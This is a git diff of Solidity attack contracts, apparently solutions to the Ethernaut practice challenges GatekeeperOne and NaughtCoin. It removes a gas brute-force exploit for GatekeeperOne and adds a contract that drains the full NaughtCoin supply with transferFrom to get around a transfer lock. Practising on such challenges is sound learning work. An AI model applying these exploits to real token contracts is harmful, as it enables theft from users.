@@ -1,40 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "./GatekeeperOne.sol";
 import "hardhat/console.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+// import "./NaughtCoin.sol";
 
 contract Attack {
+    // NaughtCoin public naughtCoinToken;
+    IERC20 naughtToken;
     address public owner;
-    GatekeeperOne public gatekeeperOneContract;
+    uint256 public INITIAL_SUPPLY = 1000000 * (10 ** 18);
 
-    constructor(address _gatekeeperOneContract) {
-        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);
-
+    constructor(address _naughtCoinn) {
+        naughtToken = IERC20(_naughtCoinn); // may not need this
         owner = msg.sender;
     }
 
-    function attack() public {
-        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
-        // locally we can use 3144
-        for (uint i = 0; i < 500; i++) {
-            try gatekeeperOneContract.enter{gas: 803100 + i}(key) {
-                console.log(
-                    "We made it past gate two using this amount of gas as i: %s",
-                    i
-                );
-                break;
-            } catch {}
-        }
+    function contractWithdrawTokens() external onlyOwner {
+        require(
+            naughtToken.transferFrom(msg.sender, address(this), INITIAL_SUPPLY),
+            "transferFrom unsuccessful"
+        );
     }
 
-    // function attack() public {
-    //     bytes8 key = bytes8(
-    //         uint64(uint160(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266))
-    //     ) & 0xFFFFFFFF0000FFFF;
-
-    //     // locally we can use 3144
-
-    //     gatekeeperOneContract.enter{gas: 800000 + 3144}(key);
-    // }
+    // Just practice but it's also so that I can be the only one to commit this exploit. Prevent frontrunning
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not the owner of the attack contract");
+        _;
+    }
 }
